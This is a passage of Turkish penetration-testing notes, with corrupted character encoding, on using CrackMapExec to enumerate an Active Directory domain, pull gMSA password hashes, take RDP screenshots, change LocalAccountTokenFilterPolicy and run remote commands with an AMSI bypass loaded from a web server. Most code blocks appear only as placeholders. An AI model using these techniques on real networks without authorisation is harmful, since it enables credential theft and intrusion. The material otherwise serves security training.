Not: Genellikle, `--loggedon-users` veya `--sessions` parametrelerinin baÅŸarÄ±lÄ± bir ÅŸekilde Ã§alÄ±ÅŸtÄ±rÄ±labilmesi iÃ§in administrator izinleri gereklidir.



### Enumerate Computers

CME ayrÄ±ca domain bilgisayarlarÄ±nÄ± da listeleyebilir ve bunu bir LDAP isteÄŸi gerÃ§ekleÅŸtirerek yapar

### Domain'deki BilgisayarlarÄ± NumaralandÄ±rma

{{CODE_BLOCK_128}}


Not: Bu seÃ§enek yalnÄ±zca SMB protokolÃ¼nde mevcut olsa da, CME bir LDAP sorgusu yapmaktadÄ±r.


### Enumerate LAPS

Local Administrator Password Solution (LAPS), domain'e baÄŸlÄ± bilgisayarlarÄ±n local hesap parolalarÄ±nÄ±n yÃ¶netimini saÄŸlar. Parolalar Active Directory'de (AD) saklanÄ±r ve ACL tarafÄ±ndan korunur, bÃ¶ylece yalnÄ±zca uygun kullanÄ±cÄ±lar bunlarÄ± okuyabilir veya sÄ±fÄ±rlama talebinde bulunabilir. LAPS domain iÃ§inde kullanÄ±lÄ±yorsa ve LAPS ÅŸifrelerini okuyabilen bir hesabÄ± tehlikeye atarsak, `--laps` seÃ§eneÄŸini bir hedef listesi ile kullanabilir ve komutlarÄ± Ã§alÄ±ÅŸtÄ±rabilir veya `--sam` gibi diÄŸer seÃ§enekleri kullanabiliriz.


{{CODE_BLOCK_129}}

Not: EÄŸer varsayÄ±lan administrator hesap adÄ± "`administrator`" deÄŸilse, -`-laps username` seÃ§eneÄŸinden sonra kullanÄ±cÄ± adÄ±nÄ± ekleyin.

### Hedefteki RID'yi Brute-forcing yaparak KullanÄ±cÄ±larÄ± NumaralandÄ±r --rid-brute

Nadiren kullanÄ±lan bir Ã¶zellik, kullanÄ±cÄ± listeleri oluÅŸturmak iÃ§in `RID Bruteforce`'dur. `BloodHound` veya `PowerView` ile bir kullanÄ±cÄ± listesi oluÅŸturabiliriz. Ancak, bu teknikler muhtemelen yakalanacak ve kurulumu biraz zaman alacaktÄ±r. CrackMapExec'in `--rid-brute` seÃ§eneÄŸini kullanarak, UserID'sini brute forcing yaparak bir kullanÄ±cÄ± listesi toplamak mÃ¼mkÃ¼ndÃ¼r.


### List Local Users

{{CODE_BLOCK_130}}

VarsayÄ±lan olarak, `--rid-brute 4000`'e kadar RID'leri zorlayarak objeleri numaralandÄ±rÄ±r. DavranÄ±ÅŸÄ±nÄ± `--rid-brute [MAX_RID]` kullanarak deÄŸiÅŸtirebiliriz.

`--rid-brute` seÃ§eneÄŸi, brute ile zorlanan kimliklerle eÅŸleÅŸen kullanÄ±cÄ± adlarÄ±nÄ± ve diÄŸer Active Directory objeleri almak iÃ§in kullanÄ±labilir. `NULL Authentication` etkinleÅŸtirilmiÅŸse domain hesaplarÄ±nÄ± numaralandÄ±rmak iÃ§in de kullanÄ±labilir. Bu seÃ§eneÄŸin bu ÅŸekillerde kullanÄ±labileceÄŸini unutmamak Ã¶nemlidir.

### Enumerate Disks

Bazen kontrol etmeyi hatÄ±rlamamÄ±z gereken Ã¶nemli bir parÃ§a, bir sunucuda bulunabilecek ek disklerdir. CrackMapExec, sunucuda var olan diskleri kontrol etmemizi saÄŸlayan bir `--disks` seÃ§eneÄŸine sahiptir.

### Enumerating Disks

{{CODE_BLOCK_131}}


### Local ve Domain GruplarÄ±nÄ± NumaralandÄ±rma

Local-groups ile local gruplarÄ± veya `--groups` ile domain gruplarÄ±nÄ± listeleyebiliriz.

### Enumerating Local Groups

{{CODE_BLOCK_132}}

### Enumerating Domain Groups

{{CODE_BLOCK_133}}


EÄŸer grup Ã¼yelerini almak istiyorsak, `--groups [GRUP ADI]` kullanabiliriz.


### Group **Members**

{{CODE_BLOCK_134}}

Not: YazÄ±m sÄ±rasÄ±nda `--local-group` yalnÄ±zca bir Domain Controller'a karÅŸÄ± Ã§alÄ±ÅŸÄ±r ve grup adÄ±nÄ± kullanarak bir grubu sorgulamak iÅŸe yaramaz.


### WMI Sorgulama

[Windows Management Instrumentation](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (WMI), Windows iÅŸletim sistemlerinde administrative iÅŸlemler iÃ§in kullanÄ±lÄ±r. Remote bilgisayarlardaki administrative gÃ¶revlerini otomatikleÅŸtirmek iÃ§in WMI script dosyalarÄ± veya uygulamalarÄ± yazabiliriz. WMI, iÅŸletim sisteminin diÄŸer bÃ¶lÃ¼mlerine ve System Center Operations Manager (eski adÄ±yla Microsoft Operations Manager (MOM)) veya Windows Remote Management (WinRM) gibi Ã¼rÃ¼nlere yÃ¶netim verileri saÄŸlar.

Windows Management Instrumentation'nÄ±n (WMI) birincil kullanÄ±m alanlarÄ±ndan biri, sÄ±nÄ±f (class) ve Ã¶rnek (instance) bilgileri iÃ§in WMI havuzunu sorgulama yeteneÄŸidir. Ã–rneÄŸin, WMI'dan remote veya local bir sistemden shut-down olaylarÄ±nÄ± temsil eden tÃ¼m objeleri dÃ¶ndÃ¼rmesini isteyebiliriz.

WMI, TCP port `135` ve bir dizi dinamik port kullanÄ±r: `49152-65535 (RPC dinamik portlarÄ± - Windows Vista, 2008 ve Ã¼zeri)`, TCP 1024-65535 (RPC dinamik portlarÄ± - Windows NT4, Windows 2000, Windows 2003) veya WMI'yÄ± Ã¶zel bir port aralÄ±ÄŸÄ± kullanacak ÅŸekilde ayarlayabiliriz

Ã–rneÄŸin, remote bir bilgisayarda `Sysmon` uygulamasÄ±nÄ±n Ã§alÄ±ÅŸÄ±p Ã§alÄ±ÅŸmadÄ±ÄŸÄ±nÄ± sorgulamak ve `Caption` ve `ProcessId`'yi gÃ¶rÃ¼ntÃ¼lemek iÃ§in WMI kullanalÄ±m, kullanacaÄŸÄ±mÄ±z WMI sorgusu S`ELECT Caption,ProcessId FROM Win32_Process WHERE Caption LIKE '%sysmon%'` ÅŸeklindedir:


### Sysmon'un Ã‡alÄ±ÅŸÄ±p Ã‡alÄ±ÅŸmadÄ±ÄŸÄ±nÄ± Sorgulamak iÃ§in WMI Kullanma

{{CODE_BLOCK_135}}

WMI, sÄ±nÄ±flarÄ±nÄ± hiyerarÅŸik bir namespace iÃ§inde dÃ¼zenler. Bir sorgu gerÃ§ekleÅŸtirmek iÃ§in, Class Name ve bulunduÄŸu Namespace'i bilmemiz gerekir. YukarÄ±daki Ã¶rnekte, `Win32_Process` sÄ±nÄ±fÄ±nÄ± `root\cimv2` namespace'inde sorguluyoruz. Namespace'i belirtmedik Ã§Ã¼nkÃ¼ varsayÄ±lan olarak CME, `root\cimv2`'yi kullanÄ±r (bu bilgiyi --help menÃ¼sÃ¼nde gÃ¶rebiliriz).

BaÅŸka bir namespace'i sorgulamak iÃ§in onu belirtmemiz gerekir. Ã–rneÄŸin, `root\WMI` namespace'inde bulunan `MSPower_DeviceEnable` sÄ±nÄ±fÄ±nÄ± sorgulayalÄ±m. Bu sÄ±nÄ±f, sistem Ã§alÄ±ÅŸÄ±rken dinamik olarak aÃ§Ä±lÄ±p kapanmasÄ± gereken cihazlar hakkÄ±nda bilgi tutar. Belirli bir konuyla ilgili WMI sÄ±nÄ±flarÄ±nÄ±n nasÄ±l bulunacaÄŸÄ± hakkÄ±nda daha fazla bilgi edinmek iÃ§in [Microsoft](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_wmi?view=powershell-5.1#finding-wmi-classes) ve [wutils.com'](https://wutils.com/wmi/)daki 3. taraf belgelerini kullanabiliriz.


### Quering root\WMI Namespace

{{CODE_BLOCK_136}}

Not: Genellikle, WMI'yÄ± sorgulamak iÃ§in administrative ayrÄ±calÄ±klarÄ±na sahip olmamÄ±z gerekir, ancak bir administrator, WMI'yÄ± sorgulamak iÃ§in administrator olmayan bir hesabÄ± yapÄ±landÄ±rabilir. Bu durumda, WMI sorgularÄ±nÄ± gerÃ§ekleÅŸtirmek iÃ§in administrator olmayan bir hesap kullanabiliriz.

WMI Sorgu Dili (WQL) hakkÄ±nda daha fazla bilgi edinmek iÃ§in [Microsoft'un Belgelerini](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wql-sql-for-wmi) okuyabiliriz.



AÅŸaÄŸÄ±daki bÃ¶lÃ¼m LDAP ve RDP protokollerini kullanarak numaralandÄ±rmayÄ± kapsayacaktÄ±r.

----


### LDAP and RDP Enumeration

Daha Ã¶nce, CrackMapExec'te en Ã§ok kullanÄ±lan protokol olan `SMB` ile bazÄ± numaralandÄ±rma seÃ§eneklerini inceledik, ancak `LDAP` ve `RDP` protokolleri ile daha fazla numaralandÄ±rma seÃ§eneÄŸi vardÄ±r

Bu bÃ¶lÃ¼mde, bu seÃ§eneklerden bazÄ±larÄ± ve hedeflerimizi nasÄ±l daha fazla numaralandÄ±rabileceÄŸimiz gÃ¶sterilecektir

### LDAP & RDP Commands

LDAP ve RDP protokolleri aÅŸaÄŸÄ±daki seÃ§enekleri iÃ§erir:

| Komut                                                                          | AÃ§Ä±klama                                                                                           |
| ------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------- |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --users`                  | Etkin Domain kullanÄ±cÄ±larÄ±nÄ± listeler.                                                             |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --groups`                 | Domain gruplarÄ±nÄ± listeler.                                                                        |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --password-notrequired`   | `PASSWORD_NOTREQD` bayraÄŸÄ± olan kullanÄ±cÄ±larÄ± listeler.                                            |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --trusted-for-delegation` | `TRUSTED_FOR_DELEGATION` bayraÄŸÄ± olan kullanÄ±cÄ± ve bilgisyalarÄ±nÄ± listeler.                        |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --admin-count`            | `adminCount=1` derecesine sahip objeleri listeler.                                                 |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --get-sid`                | Domainin SID bilgisini alÄ±r.                                                                       |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --gmsa`                   | GMSA (GruplandÄ±rÄ±lmÄ±ÅŸ YÃ¶netici Hizmet HesaplarÄ±) ÅŸifrelerini listeler.                             |
| `crackmapexec rdp <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --nla-screenshot`          | NLA (AÄŸ Seviyesinde Kimlik DoÄŸrulamasÄ±) devre dÄ±ÅŸÄ± ise RDP giriÅŸ ekranÄ±nÄ±n ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ alÄ±r. |
| `crackmapexec rdp <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --screenshot`              | BaÄŸlantÄ± baÅŸarÄ±lÄ±ysa RDP oturumunun ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ alÄ±r.                                        |
| `crackmapexec rdp <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --screentime`              | MasaÃ¼stÃ¼ gÃ¶rÃ¼ntÃ¼sÃ¼ iÃ§in bekleme sÃ¼resini belirtir.                                                 |
| `crackmapexec rdp <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --res RES`                 | Ã‡Ã¶zÃ¼nÃ¼rlÃ¼k belirler (Ã¶rnek format: WIDTHxHEIGHT, varsayÄ±lan: 1024x768).                            |

HenÃ¼z Ã§alÄ±ÅŸmadÄ±klarÄ±mÄ±z varsa onlarÄ± gÃ¶zden geÃ§irelim.

### Enumerating Users and Groups

SMB protokolÃ¼nde yaptÄ±ÄŸÄ±mÄ±z gibi, `LDAP` ile de kullanÄ±cÄ±larÄ± ve gruplarÄ± listeleyebiliriz:

### Enumerating Users and Groups

{{CODE_BLOCK_137}}

Not: Domain FQDN'sini Ã§Ã¶zÃ¼mleyemezsek LDAP protokol iletiÅŸimlerinin Ã§alÄ±ÅŸmayacaÄŸÄ±nÄ± unutmayÄ±n. Domain DNS sunucularÄ±na baÄŸlanmÄ±yorsak, FQDN'yi `/etc/hosts` dosyasÄ±nda yapÄ±landÄ±rmamÄ±z gerekir


### Ä°lginÃ§ Hesap Ã–zelliklerini NumaralandÄ±rma

`ldap` protokolÃ¼, `PASSWD_NOTREQD` veya `TRUSTED_FOR_DELEGATION` bayraÄŸÄ± ile hesaplarÄ± tanÄ±mlamamÄ±za yardÄ±mcÄ± olacak birkaÃ§ seÃ§eneÄŸe daha sahiptir ve hatta `adminCount` deÄŸeri `1` olan tÃ¼m hesaplarÄ± sorgulayabiliriz.

`PASSWD_NOTREQD` hesap denetimi attribute ayarlanmÄ±ÅŸsa, kullanÄ±cÄ± geÃ§erli password policy uzunluÄŸuna tabi deÄŸildir, yani daha kÄ±sa bir parolaya sahip olabilir veya hiÃ§ parola kullanmayabilir (domain'de boÅŸ parolalara izin veriliyorsa). Bu hesaplarÄ± tanÄ±mlamak iÃ§in  `--password-notrequired` seÃ§eneÄŸini kullanabiliriz.


### PASSWD_NOTREQD Attribute TanÄ±mlanmasÄ±

{{CODE_BLOCK_138}}

`TRUSTED_FOR_DELEGATION` attribute ayarlanÄ±rsa, bir servisin altÄ±nda Ã§alÄ±ÅŸtÄ±ÄŸÄ± servis hesabÄ± (kullanÄ±cÄ± veya bilgisayar) Kerberos yetkilendirmesi iÃ§in gÃ¼venilirdir, yani servisi talep eden bir client'i taklit edebilir. Bu saldÄ±rÄ± tÃ¼rÃ¼ne `Kerberos Unconstrained Delegation` adÄ± verilir. Bu konu hakkÄ±nda daha fazla bilgi edinmek iÃ§in bu [blog](https://adsecurity.org/?p=1667) yazÄ±sÄ±nÄ± okuyabilirsiniz.

### Unconstrained Delegation Belirlenmesi

{{CODE_BLOCK_139}}

`AdminCount` attribute, SDProp process'in bir kullanÄ±cÄ±yÄ± koruyup korumadÄ±ÄŸÄ±nÄ± belirler. Bu process'te, Active Directory'deki `AdminSDHolder`, korunan user account'lar iÃ§in ACL permissions'Ä±n bir template'i olarak gÃ¶rev yapar. EÄŸer herhangi bir account ACE'si (Ã¶rneÄŸin, bir attacker tarafÄ±ndan) modified edilirse, bu process tarafÄ±ndan korunan account'larÄ±n ACL permissions'Ä±, `SDProp` process her Ã§alÄ±ÅŸtÄ±ÄŸÄ±nda (default olarak her 60 dakikada bir Ã§alÄ±ÅŸÄ±r, ancak bu sÃ¼re modified edilebilir) templated permission set'e resetlenir. User, adminCount deÄŸeri 0 olarak set edilmiÅŸse veya specified deÄŸilse bu koruma kapsamÄ±na girmez. EÄŸer attribute value 1 olarak set edilmiÅŸse, user korunur. Attacker'lar genellikle internal environment'ta adminCount attribute'i 1 olan account'larÄ± target olarak arar. Bunlar genellikle privileged account'lardÄ±r ve further access veya full domain compromise ile sonuÃ§lanabilir.


### adminCount Attribute'u Sorgulama

{{CODE_BLOCK_140}}


### Domain SID'sini numaralandÄ±rma

BazÄ± domain attack'larÄ±, bir user veya domain SID gibi belirli domain bilgilerini elde etmemizi gerektirir. SID (Security IDentifier), bir computer veya domain controller'Ä±n sizi tanÄ±mlamak iÃ§in kullandÄ±ÄŸÄ± `unique bir ID` numarasÄ±dÄ±r. Domain SID ise domain'i tanÄ±mlayan unique bir ID numarasÄ±dÄ±r. CrackMapExec kullanarak domain SID'i elde etmek iÃ§in `--get-sid` flag'ini kullanabiliriz:

### Domain SID'i Toplama

{{CODE_BLOCK_141}}


### Group Managed Service Accounts (gMSA)

BaÄŸÄ±msÄ±z YÃ¶netilen Hizmet HesabÄ± (standalone Managed Service Account) (sMSA), aÅŸaÄŸÄ±dakileri saÄŸlayan yÃ¶netilen bir domain hesabÄ±dÄ±r:

* Otomatik parola yÃ¶netimi.
* BasitleÅŸtirilmiÅŸ service principal name (SPN) yÃ¶netimi.
* YÃ¶netimi diÄŸer yÃ¶neticilere devretme yeteneÄŸi

Bu yÃ¶netilen servis hesabÄ± (MSA) tÃ¼rÃ¼ Windows Server 2008 R2 ve Windows 7'de tanÄ±tÄ±lmÄ±ÅŸtÄ±r.

Group Managed Service Account (gMSA) domain iÃ§inde aynÄ± iÅŸlevselliÄŸi saÄŸlar ancak aynÄ± zamanda bu iÅŸlevselliÄŸi birden fazla sunucuya geniÅŸletir.

Bir gMSA hesabÄ±nÄ±n parolasÄ±nÄ± okuma ayrÄ±calÄ±klarÄ±na sahip bir hesabÄ± belirlemek iÃ§in PowerShell'i kullanabiliriz (komut yÃ¼rÃ¼tmeyi bir sonraki bÃ¶lÃ¼mde daha ayrÄ±ntÄ±lÄ± olarak ele alacaÄŸÄ±z):

### Enumerating Accounts with gMSA Privileges

{{CODE_BLOCK_142}}


YukarÄ±daki Ã¶rnekte, `engels` kullanÄ±cÄ±sÄ±nÄ±n `PrincipalsAllowedToRetrieveManagedPassword` ayrÄ±calÄ±ÄŸÄ±na sahip olduÄŸunu gÃ¶rebiliriz, bu da `svc_inlaneadm$` gMSA hesabÄ±nÄ±n parolasÄ±nÄ± okuyabileceÄŸi anlamÄ±na gelir. gMSA parolasÄ±nÄ± okuma hakkÄ±na sahip bir hesabÄ± tehlikeye atarsak, hesabÄ±n `NTLM` parola hash'ini almak iÃ§in `--gmsa` seÃ§eneÄŸini kullanabiliriz.


### gMSA ParolasÄ±nÄ± Edinme

{{CODE_BLOCK_143}}

Bu kimlik bilgilerini kullanmak iÃ§in, hash'ler iÃ§in -H seÃ§eneÄŸini kullanabiliriz.

### svc_inlaneadm$ HesabÄ± ile PaylaÅŸÄ±lan KlasÃ¶rleri Ä°nceleme

{{CODE_BLOCK_144}}


---

### RDP Screenshots

RDP protokolÃ¼ aracÄ±lÄ±ÄŸÄ±yla kullanÄ±cÄ± adlarÄ±nÄ± numaralandÄ±rmak iÃ§in CrackMapExec'i kullanabiliriz. Hedef makinede RDP'ye yalnÄ±zca `NLA` ile izin verme seÃ§eneÄŸi devre dÄ±ÅŸÄ± bÄ±rakÄ±lmÄ±ÅŸsa, oturum aÃ§ma isteminin ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ almak iÃ§in `--nlascreenshot` seÃ§eneÄŸini kullanabiliriz


### Enumerate Login Prompt

{{CODE_BLOCK_145}}

Ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ aÃ§mak iÃ§in MATE'in Eye'Ä±nÄ± veya CLI'dan eom'u kullanabiliriz.


### Ekran GÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ AÃ§mak iÃ§in MATE'in Eye Kullanma

{{CODE_BLOCK_146}}

![Pasted image 20241202231735.png](/img/user/resimler/Pasted%20image%2020241202231735.png)

EÄŸer bir kullanÄ±cÄ± adÄ± ve parolamÄ±z varsa, `--screenshot` seÃ§eneÄŸi ile RDP protokolÃ¼nÃ¼ kullanarak da ekran gÃ¶rÃ¼ntÃ¼sÃ¼ alabiliriz. Bu seÃ§enek `--screentime` ile birleÅŸtirilebilir, varsayÄ±lan olarak `10`, RDP baÄŸlantÄ±sÄ± aÃ§Ä±ldÄ±ktan sonra ekran gÃ¶rÃ¼ntÃ¼sÃ¼ almak iÃ§in bekleyeceÄŸi sÃ¼redir. Bu, bir hedef makineye baÄŸlandÄ±ÄŸÄ±mÄ±zda ve hedefin masaÃ¼stÃ¼nÃ¼ yÃ¼klemesi 10 saniyeden fazla sÃ¼rdÃ¼ÄŸÃ¼nde kullanÄ±ÅŸlÄ±dÄ±r.

Ekran gÃ¶rÃ¼ntÃ¼sÃ¼ seÃ§eneÄŸiyle birleÅŸtirilebilecek bir diÄŸer seÃ§enek de RDP baÄŸlantÄ±sÄ± sÄ±rasÄ±ndaki ekran Ã§Ã¶zÃ¼nÃ¼rlÃ¼ÄŸÃ¼ne karÅŸÄ±lÄ±k gelen `--res` seÃ§eneÄŸidir. Bu seÃ§enek yararlÄ±dÄ±r Ã§Ã¼nkÃ¼ aktif bir RDP oturumu bulursak, kullanÄ±cÄ±nÄ±n ekranÄ±nÄ±n boyutuna baÄŸlÄ± olarak tÃ¼m iÃ§eriÄŸi gÃ¶rebiliriz veya gÃ¶remeyiz. VarsayÄ±lan olarak bu seÃ§enek `1024x768` olarak ayarlanmÄ±ÅŸtÄ±r


### Screenshot Alma

{{CODE_BLOCK_147}}


Not: `--screentime` ve `--res` isteÄŸe baÄŸlÄ± bayraklardÄ±r.

Son olarak, ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ aÃ§mak iÃ§in MATE'in Eye'Ä±nÄ± veya CLI'dan eom'u kullanabiliriz:


### Ekran GÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ AÃ§mak iÃ§in MATE'in GÃ¶zÃ¼nÃ¼ Kullanma

{{CODE_BLOCK_148}}

![Pasted image 20241202232523.png](/img/user/resimler/Pasted%20image%2020241202232523.png)

Bu bÃ¶lÃ¼mde, hedeflerimize ulaÅŸmamÄ±za yardÄ±mcÄ± olabilecek LDAP ve RDP kullanarak Ã§eÅŸitli numaralandÄ±rma seÃ§eneklerini inceledik. AÅŸaÄŸÄ±daki bÃ¶lÃ¼m, CrackMapExec kullanarak komutlarÄ±n nasÄ±l Ã§alÄ±ÅŸtÄ±rÄ±lacaÄŸÄ±nÄ± gÃ¶zden geÃ§irecektir.


---

### Command Execution

Remote target Ã¼zerinde local administrator olarak bir komut Ã§alÄ±ÅŸtÄ±rmaya Ã§alÄ±ÅŸmadan Ã¶nce `UAC`'nin varlÄ±ÄŸÄ±nÄ± kontrol etmeliyiz. UAC etkinleÅŸtirildiÄŸinde, ki bu varsayÄ±lan durumdur, yalnÄ±zca `RID 500`'e sahip administrator hesabÄ± (varsayÄ±lan administrator) remote komutlarÄ± yÃ¼rÃ¼tebilir. Durumun bÃ¶yle olup olmadÄ±ÄŸÄ±nÄ± kontrol etmek iÃ§in iki registry key vardÄ±r:

`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy`
`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`

VarsayÄ±lan olarak, `LocalAccountTokenFilterPolicy` deÄŸeri 0 olarak ayarlanmÄ±ÅŸtÄ±r, yani yalnÄ±zca built-in administrator hesabÄ± (RID 500) administration gÃ¶revlerini gerÃ§ekleÅŸtirebilir. Local administrator grubunda olsak bile, yalnÄ±zca kullanÄ±cÄ±mÄ±zÄ±n RID'si `500` ise remote komutlarÄ± Ã§alÄ±ÅŸtÄ±rabiliriz. DeÄŸer 1 olarak ayarlanÄ±rsa tÃ¼m administrative hesaplarÄ± yÃ¶netim gÃ¶revlerini yÃ¼rÃ¼tebilir.

Administrator yapÄ±landÄ±rabileceÄŸi bir diÄŸer ayar da local administrator hesabÄ±nÄ±n (RID 500) remote yÃ¶netim gÃ¶revlerini yerine getirmesini engellemektir. Bu, `FilterAdministratorToken` registry deÄŸerini 1 olarak ayarlayarak yapÄ±labilir; bu, built-in administrator hesabÄ±nÄ±n (RID 500) remote administrative tasks (remote yÃ¶netim gÃ¶revleri) gerÃ§ekleÅŸtiremeyeceÄŸi anlamÄ±na gelir.


### Administrator Olarak Komut YÃ¼rÃ¼tme

KomutlarÄ± Ã§alÄ±ÅŸtÄ±rmak ve administrators grubuna kimlerin Ã¼ye olduÄŸunu gÃ¶rmek iÃ§in Administrator hesabÄ±nÄ± kullanalÄ±m. Windows komut satÄ±rÄ± komutlarÄ±nÄ± Ã§alÄ±ÅŸtÄ±rmak iÃ§in `-x` seÃ§eneÄŸini ve ardÄ±ndan Ã§alÄ±ÅŸtÄ±rmak istediÄŸimiz komutu kullanmamÄ±z gerekir.


### Bir Komutu Administrator Olarak Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_149}}


### RID 500 Olmayan Hesap Olarak Komut YÃ¼rÃ¼tme

YukarÄ±daki komutta, `localadmin` local user `Administrators` grubundadÄ±r, ancak remote komutu Ã§alÄ±ÅŸtÄ±ramaz:

### Komutu localadmin olarak Ã§alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_150}}

Bu, UAC'nin etkin olduÄŸu anlamÄ±na gelir. EÄŸer durum bÃ¶yleyse, hesap administrator olsa bile (Pwn3d!) mesajÄ±nÄ± almayacaÄŸÄ±z. Bu ayarÄ± geri almak istiyorsak, `LocalAccountTokenFilterPolicy`'yi 1 olarak ayarlayabiliriz.


### LocalAccountTokenFilterPolicy'yi DeÄŸiÅŸtirme

{{CODE_BLOCK_151}}


{{CODE_BLOCK_152}}


### Domain HesabÄ± Olarak Komut YÃ¼rÃ¼tme

`LocalAccountTokenFilterPolicy` yalnÄ±zca local hesaplar iÃ§in geÃ§erlidir. Bir domain kullanÄ±cÄ±mÄ±z varsa ve `administrators` grubunun bir parÃ§asÄ±ysa, UAC ayarÄ±yla bile komutu Ã§alÄ±ÅŸtÄ±rabiliriz. Bu senaryoda, `INLANEFREIGHT\robert` hesabÄ± `administrators` `grubunun` bir Ã¼yesidir, yani UAC etkin olsa bile komutlarÄ± yÃ¼rÃ¼tebilir.


### Komutu Robert olarak Ã§alÄ±ÅŸtÄ±r

{{CODE_BLOCK_153}}


### SMB ile Komut YÃ¼rÃ¼tme

CME'nin dÃ¶rt (4) farklÄ± komut yÃ¼rÃ¼tme yÃ¶ntemi vardÄ±r:

| Komut   | AÃ§Ä±klama                                                                                                                             |
| ------- | ------------------------------------------------------------------------------------------------------------------------------------ |
| wmiexec | WMI (Windows Management Instrumentation) kullanÄ±larak komutlar yÃ¼rÃ¼tÃ¼lÃ¼r (`diskte dosya oluÅŸturulur`).                               |
| atexec  | Windows `gÃ¶rev zamanlayÄ±cÄ±sÄ±` ile bir gÃ¶rev planlayarak komutlar yÃ¼rÃ¼tÃ¼lÃ¼r (`fileless`, ancak Windowsâ€™un en son sÃ¼rÃ¼mÃ¼nde Ã§alÄ±ÅŸmaz). |
| smbexec | Bir servis oluÅŸturup Ã§alÄ±ÅŸtÄ±rarak komutlar yÃ¼rÃ¼tÃ¼lÃ¼r (`fileless`, ancak Windowsâ€™un en son sÃ¼rÃ¼mÃ¼nde Ã§alÄ±ÅŸmaz).                       |
| mmcexec | wmiexec yÃ¶ntemine benzer, ancak komutlar Microsoft YÃ¶netim Konsolu (MMC) aracÄ±lÄ±ÄŸÄ±yla yÃ¼rÃ¼tÃ¼lÃ¼r.                                     |

Not: Her yÃ¶ntem her bilgisayarda Ã§alÄ±ÅŸmayabilir.

VarsayÄ±lan olarak, CME biri baÅŸarÄ±sÄ±z olursa farklÄ± bir yÃ¼rÃ¼tme yÃ¶ntemine geÃ§ecektir. KomutlarÄ± aÅŸaÄŸÄ±daki sÄ±rayla yÃ¼rÃ¼tmeye Ã§alÄ±ÅŸÄ±r:

* 1. wmiexec 2. atexec 3. smbexec 4. mmcexec

CME'yi yalnÄ±zca bir yÃ¼rÃ¼tme yÃ¶ntemi kullanmaya zorlamak istiyorsak, Ã¶rneÄŸin `--exec-method` bayraÄŸÄ±nÄ± kullanarak hangisini kullanacaÄŸÄ±mÄ±zÄ± belirtebiliriz:


### SMBExec YÃ¶ntemi ile Komut YÃ¼rÃ¼tme

{{CODE_BLOCK_154}}

Alternatif olarak, -X seÃ§eneÄŸini kullanarak PowerShell ile komutlarÄ± Ã§alÄ±ÅŸtÄ±rabiliriz:

### wmiexec aracÄ±lÄ±ÄŸÄ±yla PowerShell Komut YÃ¼rÃ¼tme

{{CODE_BLOCK_155}}


PowerShell seÃ§eneÄŸi -X Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda, perde arkasÄ±nda `CrackMapExec` aÅŸaÄŸÄ±dakileri yapacaktÄ±r:

* AMSI bypass 
* Obfuscate the payload 
* Execute the payload

### Ã–zel AMSI Bypass Ã‡alÄ±ÅŸtÄ±rma

Bu teknikler `PowerShell` Ã§alÄ±ÅŸtÄ±rÄ±lÄ±rken algÄ±lanabilir. Ã–zel bir AMSI bypass payload'u kullanmak istiyorsak, `--amsi-bypass` seÃ§eneÄŸini ve ardÄ±ndan kullanmak istediÄŸimiz payload'un yolunu kullanabiliriz. Ã–rneÄŸin, [AMSI Bypass DeÄŸiÅŸtirilmiÅŸ Amsi ScanBuffer](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#modified-amsi-scanbuffer-patch) YamasÄ±nÄ± kullanalÄ±m. Bunu bir dosyaya kaydedeceÄŸiz ve bu AMSI Bypass'Ä± bir web sunucusundan belleÄŸe yÃ¼klemek iÃ§in bir PowerShell scripti oluÅŸturacaÄŸÄ±z. Ä°ÅŸte adÄ±mlar:

*  â€œModified Amsi ScanBuffer Patchâ€ iÃ§eren dosyayÄ± indirin


### â€œModified Amsi ScanBuffer Patchâ€ ile Bir Dosya OluÅŸturun

{{CODE_BLOCK_156}}


Payload'u olduÄŸu gibi Ã§alÄ±ÅŸtÄ±rmaya Ã§alÄ±ÅŸÄ±rsak, komut maksimum uzunluk olan 8191 karakteri aÅŸacaÄŸÄ± iÃ§in baÅŸarÄ±sÄ±z olacaktÄ±r

### Komut Maksimum UzunluÄŸu AÅŸÄ±yor

{{CODE_BLOCK_157}}

* Bu sorunu Ã§Ã¶zmek iÃ§in, `shantanukhande-amsi.ps1` dosyasÄ±nÄ± indiren ve Ã§alÄ±ÅŸtÄ±ran bir PowerShell scripti oluÅŸturalÄ±m. AyrÄ±ca scriptimizi barÄ±ndÄ±rmak iÃ§in bir Python web sunucusu oluÅŸturmamÄ±z gerekecek.

### PowerShell Komut DosyasÄ±nÄ± OluÅŸturma ve BarÄ±ndÄ±rma

{{CODE_BLOCK_158}}


Not: Sonuna noktalÄ± virgÃ¼l (;) eklediÄŸinizden emin olun.

